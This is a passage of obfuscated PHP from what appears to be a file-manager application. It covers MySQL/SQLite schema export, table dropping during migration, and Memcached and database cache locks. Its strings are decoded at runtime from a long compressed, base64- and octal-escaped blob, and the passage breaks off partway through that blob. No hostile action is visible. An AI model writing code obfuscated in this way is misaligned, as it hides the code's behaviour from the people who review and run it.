$§ğÉ˜Ğû = strtolower($§ğÉ˜Ğû); } else { continue; } $‘©êÜÈ->execute("\144\x72\157\x70\x20\164\x61\142\154\145\40\151\x66\40\x65\170\x69\x73\164\163\40\x60{$§ğÉ˜Ğû}\140"); } } private function sqlEncode($Íôó×æ) { $í…îÕç =& $_SERVER[ç¦¬”œš]; $ñ–á©£Ç = array(); foreach ($Íôó×æ as $÷Êò•Â¥) { if (is_array($÷Êò•Â¥)) { $÷Êò•Â¥ = json_encode_force($÷Êò•Â¥); } $÷Êò•Â¥ = addslashes($÷Êò•Â¥); $÷Êò•Â¥ = str_replace(array($í…îÕç[1158], $í…îÕç[262], $í…îÕç[418]), array($í…îÕç[1159], $í…îÕç[1160], $í…îÕç[1161]), $÷Êò•Â¥); $ñ–á©£Ç[] = $÷Êò•Â¥; } return $í…îÕç[58] . implode($í…îÕç[1162], $ñ–á©£Ç) . $í…îÕç[58]; } private function sqlDecode($ç€ª¡ı, $£¤ıËŞ´, $Şİ«¢˜’ = '') { $Ç³–è¯¨ =& $_SERVER[ç¦¬”œš]; $ç€ª¡ı = str_replace(array($Ç³–è¯¨[1159], $Ç³–è¯¨[1160], $Ç³–è¯¨[1161]), array($Ç³–è¯¨[1158], $Ç³–è¯¨[262], $Ç³–è¯¨[418]), $ç€ª¡ı); if ($£¤ıËŞ´ == $Ç³–è¯¨[13]) { $ç€ª¡ı = str_ireplace($Ç³–è¯¨[1163], $Ç³–è¯¨[59], $ç€ª¡ı); $ç€ª¡ı = stripslashes($ç€ª¡ı); } return preg_replace($Ç³–è¯¨[1164], $Ç³–è¯¨[12], $ç€ª¡ı); if ($£¤ıËŞ´ == $Ç³–è¯¨[13]) { return $Şİ«¢˜’ != $Ç³–è¯¨[1165] ? stripslashes($ç€ª¡ı) : $ç€ª¡ı; } if ($Şİ«¢˜’ == $Ç³–è¯¨[1165]) { $ç€ª¡ı = str_replace($Ç³–è¯¨[1166], $Ç³–è¯¨[121], stripslashes($ç€ª¡ı)); } return $ç€ª¡ı; } public function getSqlFile($´Šå…ù´ = '') { $ó©¤µÊİ =& $_SERVER[ç¦¬”œš]; $”…²œ·† = $this->dbType(!0); $™¤Ä¯ù³ = CONTROLLER_DIR . "\x69\x6e\163\x74\x61\154\x6c\57\x64\141\x74\141\57{$”…²œ·†}\x2e\x73\x71\154"; $“­Ä³ = file_get_contents($™¤Ä¯ù³); $¯š¤àá¶ = $ó©¤µÊİ[1167] . ($”…²œ·† == $ó©¤µÊİ[884] ? $ó©¤µÊİ[1168] : $ó©¤µÊİ[1169]) . $ó©¤µÊİ[1170]; preg_match_all($¯š¤àá¶, $“­Ä³, $ï˜ôÊ¹); $ Ÿ°Î¥Î = $ï˜ôÊ¹[1]; $ÅŠ·Áàû = $this->model()->db(); $Úïˆ“Åş = $ÅŠ·Áàû->getTables(); $º¢ª›Íç = TEMP_FILES . $ó©¤µÊİ[1171] . date($ó©¤µÊİ[272]) . $ó©¤µÊİ[8]; del_dir($º¢ª›Íç); mk_dir($º¢ª›Íç); $¬ñŠº”Œ = $º¢ª›Íç . $ó©¤µÊİ[1172]; $ñ¯Ã§İÉ = $º¢ª›Íç . $ó©¤µÊİ[1173]; $¯Üó­ĞÈ = $”…²œ·† == $ó©¤µÊİ[13] ? $ó©¤µÊİ[884] : $ó©¤µÊİ[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\163\x74\x61\x6c\154\x2f\144\x61\164\x61\57{$¯Üó­ĞÈ}\56\163\x71\x6c", $º¢ª›Íç); @touch($º¢ª›Íç . $”…²œ·† . $ó©¤µÊİ[868]); $¶ÙØËêì = fopen($¬ñŠº”Œ, $ó©¤µÊİ[1146]); $öÈˆ•«’ = fopen($ñ¯Ã§İÉ, $ó©¤µÊİ[1146]); if ($”…²œ·† == $ó©¤µÊİ[13]) { $Úïˆ“Åş = array_diff($Úïˆ“Åş, array($ó©¤µÊİ[860], $ó©¤µÊİ[861])); $Ú±†‡ˆÙ = array($ó©¤µÊİ[1174], $ó©¤µÊİ[1175], $ó©¤µÊİ[1176]); fwrite($öÈˆ•«’, implode(PHP_EOL, $Ú±†‡ˆÙ) . PHP_EOL . PHP_EOL); foreach ($Úïˆ“Åş as $ûÒúÚÅ) { $œÙîëÈÓ = $this->sqlFromSqlite($ûÒúÚÅ); if (!$œÙîëÈÓ[$ó©¤µÊİ[13]]) { continue; } fwrite($öÈˆ•«’, $œÙîëÈÓ[$ó©¤µÊİ[13]] . PHP_EOL . PHP_EOL); if (!in_array($ûÒúÚÅ, $ Ÿ°Î¥Î)) { fwrite($¶ÙØËêì, $œÙîëÈÓ[$ó©¤µÊİ[884]] . PHP_EOL . PHP_EOL); } } } else { foreach ($Úïˆ“Åş as $ûÒúÚÅ) { $œÙîëÈÓ = $this->sqlFromMysql($ûÒúÚÅ); if (!$œÙîëÈÓ[$ó©¤µÊİ[884]]) { continue; } fwrite($¶ÙØËêì, $œÙîëÈÓ[$ó©¤µÊİ[884]] . PHP_EOL . PHP_EOL); if (!in_array($ûÒúÚÅ, $ Ÿ°Î¥Î)) { fwrite($öÈˆ•«’, $œÙîëÈÓ[$ó©¤µÊİ[13]] . PHP_EOL . PHP_EOL); } } } fclose($¶ÙØËêì); fclose($öÈˆ•«’); $“­Ä³ = array($ó©¤µÊİ[884] => $¬ñŠº”Œ, $ó©¤µÊİ[13] => $ñ¯Ã§İÉ); return $´Šå…ù´ ? $“­Ä³[$´Šå…ù´] : $“­Ä³; } public function dbType($úò”³Èû = false) { $ˆÏË’ˆˆ =& $_SERVER[ç¦¬”œš]; $”ÊóìÑ = $úò”³Èû ? $GLOBALS[$ˆÏË’ˆˆ[6]][$ˆÏË’ˆˆ[21]] : $this->database; $”ÊóìÑ = array_change_key_case($”ÊóìÑ); $åı”î€ = $”ÊóìÑ[$ˆÏË’ˆˆ[1046]]; if ($åı”î€ == $ˆÏË’ˆˆ[1043]) { $ï£ºÜ¥ö = explode($ˆÏË’ˆˆ[4], $”ÊóìÑ[$ˆÏË’ˆˆ[1052]]); $åı”î€ = $ï£ºÜ¥ö[0]; } $Ü´¾øÌ = array($ˆÏË’ˆˆ[1177] => $ˆÏË’ˆˆ[13], $ˆÏË’ˆˆ[991] => $ˆÏË’ˆˆ[884]); if (isset($Ü´¾øÌ[$åı”î€])) { $åı”î€ = $Ü´¾øÌ[$åı”î€]; } return $åı”î€; } public function sqlFromMysql($°”î¦¥Ù, $å±“ä = '') { $ì€½ŠĞ¾ =& $_SERVER[ç¦¬”œš]; $¹œ„£ÁÀ = $this->model()->db(); $å¦½Æµé = $¹œ„£ÁÀ->query($ì€½ŠĞ¾[1178] . $°”î¦¥Ù . $ì€½ŠĞ¾[461]); if (!$å¦½Æµé || !$å¦½Æµé[0]) { return !1; } $‡•­›šƒ = _get($å¦½Æµé[0], $ì€½ŠĞ¾[1179], $ì€½ŠĞ¾[12]); if (!$‡•­›šƒ) { return !1; } $úŞ‹Õ»Æ = "\x44\x52\117\x50\40\x54\101\102\x4c\x45\40\x49\106\40\105\x58\111\123\x54\x53\40\140{$°”î¦¥Ù}\x60\x3b" . PHP_EOL . $‡•­›šƒ . $ì€½ŠĞ¾[74]; if ($å±“ä && $å±“ä == $ì€½ŠĞ¾[884]) { return $úŞ‹Õ»Æ; } $°«á¤œ÷ = array_change_key_case($GLOBALS[$ì€½ŠĞ¾[6]][$ì€½ŠĞ¾[21]]); $™„Ñï„› = $°«á¤œ÷[$ì€½ŠĞ¾[1051]]; $óæÕ£« = $ì€½ŠĞ¾[1180] . $™„Ñï„› . $ì€½ŠĞ¾[1181] . $°”î¦¥Ù . $ì€½ŠĞ¾[58]; $øÕ–äÓ¢ = $ì€½ŠĞ¾[1182] . $°”î¦¥Ù . $ì€½ŠĞ¾[979]; $æ¤ Øğ‘ = $¹œ„£ÁÀ->query($óæÕ£«); if (empty($æ¤ Øğ‘)) { $ƒĞ´½Úœ = array($ì€½ŠĞ¾[884] => $ì€½ŠĞ¾[12], $ì€½ŠĞ¾[13] => $ì€½ŠĞ¾[12]); return $å±“ä ? $ƒĞ´½Úœ[$å±“ä] : $ƒĞ´½Úœ; } $ã‡Î‡åõ = $¹œ„£ÁÀ->query($øÕ–äÓ¢); $á–¹¶îè = $ì€½ŠĞ¾[12]; $¨óÙëÇ = array(); foreach ($ã‡Î‡åõ as $ÆÊ†Ä‹í) { if (!$á–¹¶îè && $ÆÊ†Ä‹í[$ì€½ŠĞ¾[1183]] == $ì€½ŠĞ¾[1184]) { $á–¹¶îè = $ÆÊ†Ä‹í[$ì€½ŠĞ¾[1185]]; } if (isset($¨óÙëÇ[$ÆÊ†Ä‹í[$ì€½ŠĞ¾[1183]]])) { $¨óÙëÇ[$ÆÊ†Ä‹í[$ì€½ŠĞ¾[1183]]][$ì€½ŠĞ¾[1186]][] = $ÆÊ†Ä‹í[$ì€½ŠĞ¾[1185]]; continue; } $¨óÙëÇ[$ÆÊ†Ä‹í[$ì€½ŠĞ¾[1183]]] = array($ì€½ŠĞ¾[1187] => $ÆÊ†Ä‹í[$ì€½ŠĞ¾[1183]], $ì€½ŠĞ¾[1186] => array($ÆÊ†Ä‹í[$ì€½ŠĞ¾[1185]]), $ì€½ŠĞ¾[1188] => $ÆÊ†Ä‹í[$ì€½ŠĞ¾[1189]] == $ì€½ŠĞ¾[91] ? 0 : 1); } $¹²Ø¥Ö§ = array(); foreach ($¨óÙëÇ as $ÆÊ†Ä‹í) { $Á³ª½’± = $ÆÊ†Ä‹í[$ì€½ŠĞ¾[1187]] == $ì€½ŠĞ¾[1184]; $¡îñÛ™Ø = array($ì€½ŠĞ¾[1190], $ÆÊ†Ä‹í[$ì€½ŠĞ¾[1188]] == $ì€½ŠĞ¾[91] && !$Á³ª½’± ? $ì€½ŠĞ¾[1191] : $ì€½ŠĞ¾[12], $ì€½ŠĞ¾[1192], $ì€½ŠĞ¾[1193] . $°”î¦¥Ù . $ì€½ŠĞ¾[11] . ($Á³ª½’± ? $ì€½ŠĞ¾[1194] : $ÆÊ†Ä‹í[$ì€½ŠĞ¾[1187]]) . $ì€½ŠĞ¾[121], $ì€½ŠĞ¾[1195], $ì€½ŠĞ¾[121] . $°”î¦¥Ù . $ì€½ŠĞ¾[121], $ì€½ŠĞ¾[1196] . implode($ì€½ŠĞ¾[1197], $ÆÊ†Ä‹í[$ì€½ŠĞ¾[1186]]) . $ì€½ŠĞ¾[1198]); $¹²Ø¥Ö§[] = implode($ì€½ŠĞ¾[53], $¡îñÛ™Ø) . $ì€½ŠĞ¾[74]; } $¯ÙÑÏÉ„ = array(); $´Ê…Øàõ = array($ì€½ŠĞ¾[1199] => $ì€½ŠĞ¾[1200], $ì€½ŠĞ¾[1200] => $ì€½ŠĞ¾[1200], $ì€½ŠĞ¾[364] => $ì€½ŠĞ¾[391], $ì€½ŠĞ¾[363] => $ì€½ŠĞ¾[391]); foreach ($æ¤ Øğ‘ as $ÆÊ†Ä‹í) { $¡îñÛ™Ø = array($ì€½ŠĞ¾[121] . $ÆÊ†Ä‹í[$ì€½ŠĞ¾[1201]] . $ì€½ŠĞ¾[121], isset($´Ê…Øàõ[$ÆÊ†Ä‹í[$ì€½ŠĞ¾[1202]]]) ? $´Ê…Øàõ[$ÆÊ†Ä‹í[$ì€½ŠĞ¾[1202]]] : $ÆÊ†Ä‹í[$ì€½ŠĞ¾[1203]], $ÆÊ†Ä‹í[$ì€½ŠĞ¾[1204]] == $ì€½ŠĞ¾[977] ? $ì€½ŠĞ¾[1205] : $ì€½ŠĞ¾[1206], $ÆÊ†Ä‹í[$ì€½ŠĞ¾[1201]] == $á–¹¶îè ? $ì€½ŠĞ¾[1207] : $ì€½ŠĞ¾[12], $ÆÊ†Ä‹í[$ì€½ŠĞ¾[1028]] ? strtoupper(str_replace($ì€½ŠĞ¾[11], $ì€½ŠĞ¾[12], $ÆÊ†Ä‹í[$ì€½ŠĞ¾[1028]])) : $ì€½ŠĞ¾[12]); $¯ÙÑÏÉ„[] = trim(implode($ì€½ŠĞ¾[53], $¡îñÛ™Ø)); } $¬éÏ´Ê = array($ì€½ŠĞ¾[1208] . $°”î¦¥Ù . $ì€½ŠĞ¾[1209], $ì€½ŠĞ¾[1210] . $°”î¦¥Ù . $ì€½ŠĞ¾[1211], implode($ì€½ŠĞ¾[50] . PHP_EOL, $¯ÙÑÏÉ„), $ì€½ŠĞ¾[1025]); $€Á«í¯ = implode(PHP_EOL, array_merge($¬éÏ´Ê, $¹²Ø¥Ö§)); if ($å±“ä && $å±“ä == $ì€½ŠĞ¾[13]) { return $€Á«í¯; } $ƒĞ´½Úœ = array($ì€½ŠĞ¾[884] => $úŞ‹Õ»Æ, $ì€½ŠĞ¾[13] => $€Á«í¯); return $å±“ä ? $ƒĞ´½Úœ[$å±“ä] : $ƒĞ´½Úœ; } public function sqlFromSqlite($ÌóÉ¦œË, $ãè†ƒáé = '') { $»úÈšâ =& $_SERVER[ç¦¬”œš]; $†ø½Ë‹ = $this->model()->db(); $Î­ Ò• = "\x50\x52\101\x47\x4d\101\40\x54\101\102\114\105\137\x49\x4e\x46\117\40\50\x27{$ÌóÉ¦œË}\47\51"; $õúÓ» = "\x53\x45\114\105\x43\124\40\52\x20\106\122\x4f\115\40\163\161\x6c\x69\x74\x65\x5f\155\x61\163\x74\145\x72\40\127\110\105\122\x45\40\164\142\x6c\x5f\x6e\141\155\x65\40\x3d\40\47{$ÌóÉ¦œË}\x27"; $·ŠĞ¶Ïœ = $†ø½Ë‹->query($Î­ Ò•); if (empty($·ŠĞ¶Ïœ)) { $ß“Ûİ¹ë = array($»úÈšâ[884] => $»úÈšâ[12], $»úÈšâ[13] => $»úÈšâ[12]); return $ãè†ƒáé ? $ß“Ûİ¹ë[$ãè†ƒáé] : $ß“Ûİ¹ë; } $®®‹³‹” = $†ø½Ë‹->query($õúÓ»); $®öœ™‹“ = $®—½ÎÆ° = array(); foreach ($®®‹³‹” as $Û®…âø) { if ($Û®…âø[$»úÈšâ[33]] == $»úÈšâ[356]) { $®öœ™‹“[] = $Û®…âø[$»úÈšâ[1212]]; } else { $®—½ÎÆ°[$Û®…âø[$»úÈšâ[32]]] = $Û®…âø[$»úÈšâ[1212]]; } } $‰­íÔ„ = array_merge(array($»úÈšâ[1208] . $ÌóÉ¦œË . $»úÈšâ[121]), $®öœ™‹“, array_values($®—½ÎÆ°)); $‰­íÔ„ = implode($»úÈšâ[74] . PHP_EOL, $‰­íÔ„) . $»úÈšâ[74]; if ($ãè†ƒáé && $ãè†ƒáé == $»úÈšâ[13]) { return $‰­íÔ„; } $—ìœê–“ = array(); $¿ĞæĞ§© = array($»úÈšâ[1200] => $»úÈšâ[1213], $»úÈšâ[391] => $»úÈšâ[1214]); $·‚ÂĞ¼³ = $»úÈšâ[12]; foreach ($·ŠĞ¶Ïœ as $Û®…âø) { if ($Û®…âø[$»úÈšâ[57]] == $»úÈšâ[91]) { $·‚ÂĞ¼³ = $Û®…âø[$»úÈšâ[32]]; } $Ş»£Ë•å = array($»úÈšâ[461] . $Û®…âø[$»úÈšâ[32]] . $»úÈšâ[461], isset($¿ĞæĞ§©[$Û®…âø[$»úÈšâ[33]]]) ? $¿ĞæĞ§©[$Û®…âø[$»úÈšâ[33]]] : $Û®…âø[$»úÈšâ[33]], $Û®…âø[$»úÈšâ[35]] == $»úÈšâ[91] ? $»úÈšâ[1205] : $»úÈšâ[1215] . $Û®…âø[$»úÈšâ[56]], $Û®…âø[$»úÈšâ[57]] == $»úÈšâ[91] ? $»úÈšâ[1216] : $»úÈšâ[12]); $—ìœê–“[] = trim(implode($»úÈšâ[53], $Ş»£Ë•å)); } foreach ($®—½ÎÆ° as $–Æø–“Ä => $ûÎ¢ŒŒ˜) { $èÇ ìä  = str_replace($»úÈšâ[1217] . $ÌóÉ¦œË . $»úÈšâ[11], $»úÈšâ[12], $–Æø–“Ä); $·×Ì¾İ = str_replace(array($»úÈšâ[121], $»úÈšâ[1036]), $»úÈšâ[461], substr($ûÎ¢ŒŒ˜, stripos($ûÎ¢ŒŒ˜, $»úÈšâ[337]))); if ($èÇ ìä  == $»úÈšâ[1194]) { $ÌÅú‚½Õ = $»úÈšâ[1218] . $·‚ÂĞ¼³ . $»úÈšâ[1219]; } else { $ÌÅú‚½Õ = (stripos($èÇ ìä , $»úÈšâ[11]) ? $»úÈšâ[1220] : $»úÈšâ[12]) . ($»úÈšâ[1221] . $èÇ ìä  . $»úÈšâ[1222] . $·×Ì¾İ); } $—ìœê–“[] = $ÌÅú‚½Õ; } $äïÛÛŞá = array($»úÈšâ[1223] . $ÌóÉ¦œË . $»úÈšâ[1224], $»úÈšâ[1225] . $ÌóÉ¦œË . $»úÈšâ[1226], implode($»úÈšâ[50] . PHP_EOL, $—ìœê–“), $»úÈšâ[1227]); $³äÉ–Ÿ = implode(PHP_EOL, $äïÛÛŞá); if ($ãè†ƒáé && $ãè†ƒáé == $»úÈšâ[884]) { return $³äÉ–Ÿ; } $ß“Ûİ¹ë = array($»úÈšâ[884] => $³äÉ–Ÿ, $»úÈšâ[13] => $‰­íÔ„); return $ãè†ƒáé ? $ß“Ûİ¹ë[$ãè†ƒáé] : $ß“Ûİ¹ë; } } goto E÷ïÂ‚Ç¨; AƒÁÇŞ¦Çâ: class CacheLockMemcached { public function lock($ØÒ½¹ÈÄ, $×Ç°æÆ¯ = 0) { $±ğ°¶¹– = Cache::init(); $êõ°íçï = microtime(!0) + $×Ç°æÆ¯; while (microtime(!0) < $êõ°íçï) { $­ıÔ¨¼ä = $±ğ°¶¹–->get($ØÒ½¹ÈÄ); if (!$­ıÔ¨¼ä || $­ıÔ¨¼ä < microtime(!0)) { $Ã‡¸é™ = $±ğ°¶¹–->handle->add($ØÒ½¹ÈÄ, $êõ°íçï, $×Ç°æÆ¯); if ($Ã‡¸é™) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ñª´øò§) { return Cache::init()->get($ñª´øò§); } public function unlock($‡™ô×Ò‰) { return Cache::init()->remove($‡™ô×Ò‰); } } class CacheLockDatabase { public function lock($‰—Ï°Ñï, $ó²–ÜÖì = 0) { $³¬£¤È¢ = Model($_SERVER[ç¦¬”œš][908]); $à“¤«µ° = microtime(!0) + $ó²–ÜÖì; while (microtime(!0) < $à“¤«µ°) { $€ò©ÆÔ¸ = $³¬£¤È¢->get($‰—Ï°Ñï); if (!$€ò©ÆÔ¸ || $€ò©ÆÔ¸ < microtime(!0)) { $ŸÍŞø¸ = $³¬£¤È¢->set($‰—Ï°Ñï, $à“¤«µ°); if ($ŸÍŞø¸) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ÁØÄøÚÍ) { return Model($_SERVER[ç¦¬”œš][908])->get($ÁØÄøÚÍ); } public function unlock($öÏˆÎ”ò) { Model($_SERVER[ç¦¬”œš][908])->remove($öÏˆÎ”ò); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($ÅàıëœŠ, $Š¯€áŠ¬) { $áÜˆ½›» =& $_SERVER[ç¦¬”œš]; if (!class_exists($áÜˆ½›»[946])) { show_json($áÜˆ½›»[947], !1); } $this->cacheTime = $Š¯€áŠ¬; $this->handle = new Memcached(); if (is_array($ÅàıëœŠ[$áÜˆ½›»[948]]) && count($ÅàıëœŠ[$áÜˆ½›»[948]]) >= 1) { foreach ($ÅàıëœŠ[$áÜˆ½›»[948]] as $¸Ä¦Ä•Ç) { $Ääş˜­´ = explode($áÜˆ½›»[4], $¸Ä¦Ä•Ç); $this->handle->addServer($Ääş˜­´[0], $Ääş˜­´[1]); } } else { $this->handle->addServer($ÅàıëœŠ[$áÜˆ½›»[208]], $ÅàıëœŠ[$áÜˆ½›»[209]]); } } public function set($¶’—á½§, $ûúü–â, $³ò¿ïì = false) { $³ò¿ïì = $³ò¿ïì ? $³ò¿ïì : $this->cacheTime; return $this->handle->set($¶’—á½§, $ûúü–â, $³ò¿ïì); } public function get($½š¹«¢) { return $this->handle->get($½š¹«¢); } public function remove($†…‘Î¹¥) { return $this->handle->delete($†…‘Î¹¥); } public function deleteAll() { return $this->handle->flush(); } } goto D†¿Ö²‘Ô; F–ïŞÉÛ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xe7\xa6\xac\x94\x9c\x9a", "\340\312\256\206\266\241"); $_SERVER[ç¦¬”œš] = explode(base64_decode('fAN8BXwE'), gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\11\170\33\325\265\60\24\372\50\274\246\360\12\155\50\41\60\30\22\333\211\26\333\161\66\47\116\220\155\331\26\221\55\107\222\263\140\73\223\261"."\x34\x96\x27\x96\x34\x8a\x66\xe4\x2d\x9\x65\xf\x5b\x8\x6b\xd8\xcb\xbe\xbd\x34\x9\x3b\xa1\x2c\x81\x16\xf2\xe0\x51\x96\x2e\x14\x5a\x28\x94\x12\x3b\x9\xf0\xa\xa5\x2c\x5d\xa0\xfc\x77\x39\x77\x99\x91\xc\xfd"."\277\367\177\337\37\110\164\367\271\313\271\347\234\173\356\271\347\354\336\370\320\353\133\77\130\177\320\372\157\256\77\370\202\277\76\163\345\205\157\323\60\372\357\233\353\277\101\303\307\137\370\255"."\x3\xc8\x9f\x23\x2f\xbc\xa0\xa2\xa2\x75\xce\x61\x33\xdb\xbf\xbd\xf9\x81\x6d\xda\xdd\xda\x36\xed\x82\x48\xf8\xf9\x9f\x87\x26\xbd\xf8\xe3\x53\x82\xe3\xb7\x3e\x3f\x32\x7e\xe0\x1\xa3\x55\xb1\x8f\xea\x50\x61\x5a"."\xb7\x8e\xfe\x28\x59\xd3\x56\xf4\x61\xc3\xb2\x2d\x9a\x90\x30\xb3\x7d\x46\x8a\x86\x8d\x2c\xfd\xf5\xd3\x9f\xce\x68\x38\xaf\x67\x4c\x5b\xa7\x51\x1f\xfd\x51\xa1\x5f\xe4\x5f\x6b\x6d\xda\x60\xf9\x6a\x7b\x24\xae\xc6"."\x3a\x3b\x3a\x82\xd1\x38\x14\xaa\x93\xf3\x33\x66\x12\x42\x39\x2d\xaf\x65\xe0\xfb\x39\x3d\x6f\xa1\xde\xc8\xcd\xa9\x39\x33\xa7\x67\x1d\x29\x22\x21\xa9\xd9\x5a\xaf\x66\x41\x4b\x4d\xd\x6a\x53\xb0\x23\x1c\x59\xa9"."\xc6\x57\x76\x4\xa1\x44\xaf\xba\xb6\xa0\xe7\x47\x68\x8c\x4\x63\xb6\x96\xb7\xe3\x46\x46\xe7\x25\x86\xf2\xbc\x5f\xd\xc1\x96\x50\xbb\x12\x8f\x6\xda\x63\x81\xc6\x78\x28\xd2\x4e\x93\x1b\x23\x6d\x6d\xa1\x78\x71"."\x7a\x34\x12\xe\x37\x4\x1a\x97\x14\xe7\x74\x44\x3\x2d\x6d\x1\x5\xf5\x2f\xad\xab\x46\xb6\xcf\xac\x50\x56\xd3\x9c\xd5\x4a\x25\xd\x34\x1b\x7a\x3a\x49\x83\x59\x8d\x75\xc7\x1e\xc9\x41\x28\xce\x43\x68\x99\xb2"."\x85\x74\x9a\x46\xda\x79\x28\xa9\xf7\x69\x85\x34\xcc\x56\x93\x1c\xc9\xe5\x8d\x8c\xc6\x6\xbd\x44\x1f\xe1\xa9\x34\xa0\x15\x6c\xd3\xc8\x26\x68\x24\x38\x6c\xe7\x35\x91\x8e\xfa\x9a\x40\xb\xad\x67\xa1\xa9\x58\x30"."\34\154\214\53\270\203\112\163\64\322\246\300\42\144\64\313\326\363\312\362\326\140\64\250\340\116\327\227\223\261\226\53\0\57\355\150\52\224\100\70\254\114\324\202\255\147\162\254\31\132\247\104"."\143\221\150\123\60\252\64\254\124\304\14\45\314\114\306\314\372\120\53\150\45\155\251\253\301\150\224\6\74\0\336\341\20\136\64\210\104\232\233\143\101\36\203\301\55\15\243\236\314\2\370\164".base64_decode('xJJ9aVsd1NIFBqYD9LccfuDXtAB01xpZowBgCk2YJt9WECiw0jpL0ZMQyKD6JtTrhbReVg==')."\x6a\xd\xb\x18\x68\x87\xe\xd2\x60\xfd\x22\xfa\xbb\x0\xea\xf7\xaa\x38\x4f\xcf\xdb\xaa\x9e\x4d\x98\x49\x23\xb\xfb\x78\x31\xc0\xa3\x66\xf7\x37\xe5\xd\x54\x80\xc6\xfb\xcc\x74\x92\x85\x2d\x63\x14\x46\xd9\x67"."\xa4\xf5\xf6\x42\x46\x2e\xc2\xa3\x89\x7e\x23\x9d\xcc\xb3\xad\xf7\x55\x25\x69\x34\xcc\x77\x32\x2e\x2b\x62\x39\xd4\x13\x8e\x4\x8c\xbe\x11\xb1\x15\x71\xb9\xe\x9e\x6b\x99\x85\x7c\x42\xf\xa1\xad\x43\xe3\xd5\x90".base64_decode('rNs2GhybELMzlza1ZEzP86EZZjNqKFKw5cQCKdZs5jNNCGnA99GGMTpLZAywLZOUZsxf0Q==')."\165\206\367\237\75\135\47\243\177\52\1\53\166\103\237\372\365\164\132\325\207\165\330\123\231\344\154\213\115\206\337\352\65\262\176\224\102\243\241\210\332\257\131\375\155\311\331\52\251\305\220\155".base64_decode('Uh/25fpzsOH5Hu92wDyeunbTDkooO20mtLQ8RBrut+1cTM8m8UzAUMyhLJmpnK5DoSaPkg==').base64_decode('VNqUlUprnVFnsYqZNA+x0fE0iyfaw2w5k30ArYxilMEHDYsgP7FztVwubSQ02zCzfjNh6w==')."\266\327\262\363\272\6\55\6\22\11\335\262\274\215\146\326\316\233\151\157\40\235\66\207\274\221\274\221\62\262\165\312\14\300\303\50\23\355\167\57\306\215\165\260\211\313\26\50\30\160\360\147"."\x66\xd4\x17\xec\x3e\xef\x3c\xb6\x39\x79\xe9\xbc\x96\xb5\xfa\xf4\xbc\x37\x8\x3b\xa3\x4e\x41\x9d\xe5\x8\x92\x15\x6b\x32\xac\x9c\x69\x19\xb8\x7b\x75\x8a\x66\xdb\x5a\xa2\x1f\x23\x17\xd1\x7c\xfd\x57\x94\x37\xb2"."\151\43\253\27\227\105\215\350\336\216\274\226\312\150\165\112\256\320\213\46\0\66\44\244\45\160\11\271\60\114\100\235\222\321\206\275\132\212\265\24\34\316\31\171\335\142\243\126\132\332\342\0".base64_decode('UX3eNryRDD3pjSHsDY3NqqpVEKwoLI+mtsbjHWqoGZHn9qDaFog3tkLrtpZiTYcRTuZNsg==')."\304\25\136\264\241\60\64\265\243\301\211\304\16\163\110\317\243\17\67\214\324\51\3\146\262\327\34\366\261\54\134\70\206\60\13\53\214\327\67\147\173\243\132\66\205\207\321\73\142\353\226\33"."\x37\x35\x20\x62\xee\xeb\xa3\xbb\xd7\xd7\xab\xf7\x99\x79\x18\x8d\x35\x98\x72\x4e\x7e\x58\xcf\xa6\xec\x7e\xd6\x76\x2c\x18\x5d\x16\x8c\xaa\xb1\x48\x73\x7c\x79\x20\xa\xb4\x3f\x8b\x20\x67\x98\xf5\x6\x7f\x3d\xed".base64_decode('jepJNIkJm9XTcmL2V3jxhsEfZ7l4E7G8cKgFz12T10KFvHIp1nbYyBh4eDbPIZONGIMW6A==')."\220\237\214\271\276\333\232\121\321\235\234\131\351\105\377\316\250\354\352\156\362\315\350\131\354\67\104\35\177\265\257\132\251\251\232\243\164\40\116\305\320\322\12\14\272\250\104\225\22\131\342\234"."\26\1\341\131\63\253\227\334\130\10\220\114\113\367\266\352\32\102\322\150\41\34\353\342\141\337\242\361\257\230\135\114\53\45\134\342\132\27\232\30\15\56\355\14\306\342\152\133\60\336\32\151"."\x82\xee\x7\x3\x10\xca\xa2\xca\xa4\xbf\x6c\x8d\x31\x63\x6\x64\x31\xb\xcd\xea\xc3\x12\xd\x11\xb4\x20\x21\x4f\x8\xa9\xd7\x6e\xe\x31\xec\xef\x2\xa0\xc6\x7e\x3d\x31\x30\x41\x1e\xa\xc1\x68\x4c\x8a\x97\xd8"."\322\165\321\237\36\200\346\36\372\243\32\126\263\104\67\161\224\343\127\325\354\135\203\40\253\115\147\104\4\276\24\312\240\75\54\172\256\72\211\34\33\126\233\200\164\264\145\226\33\111\116\5"."\x51\xb4\x55\x37\x52\xfd\xd0\x51\x3\x37\x97\x30\xd3\x66\x5e\x4b\x63\xdc\xcf\x18\xd7\x94\x1\x68\x38\x97\x2e\x20\xb8\xf7\xe3\x86\xe3\xfd\x85\x4c\x2f\x50\x2a\x34\x47\x29\xdd\x16\x3c\xa5\x35\x82\x18\xaf\xc\xa3"."\310\210\254\333\241\46\7\335\205\230\137\305\260\332\355\313\145\123\225\47\101\133\152\315\354\52\234\0\313\10\43\103\314\165\101\57\36\272\57\141\242\215\335\246\15\350\165\170\54\200\315\26".strrev('!aÛ9·—‰B¬$€Oæo>z)Æ“eñé•NM6A—ÚO/xİêãLæ‘T')."\24\300\302\375\46\147\123\114\6\214\165\176\30\367\264\232\146\100\33\111\304\256\371\54\33\55\2\32\240\226\114\226\112\106\250\6\32\130\317\340\224\144\60\76\300\37\233\205\376\27\104\77"."\151\146\64\106\102\11\361\323\223\224\372\71\222\350\266\245\111\63\130\273\171\333\304\231\171\107\111\4\211\375\46\364\14\55\75\214\252\300\207\307\6\232\324\323\72\203\242\176\235\61\20\125".base64_decode('UAxNP4exPg7s6IiAUgXnZlhRVBOTexZfjs9UIgHzPAA8IphGSxchu0bEO/J6nzHMEMSw3Q==')."\xa6\xe5\x7\xd8\xc0\x50\x4d\xb1\xdf\x70\x44\xda\x8b\xcd\x9d\xe1\xb0\xda\x18\x69\x8f\xa3\x23\x19\x4d\x59\x1e\xd\xc5\x83\xc\xf\x5\x9a\xd4\x40\x63\x7\xc4\x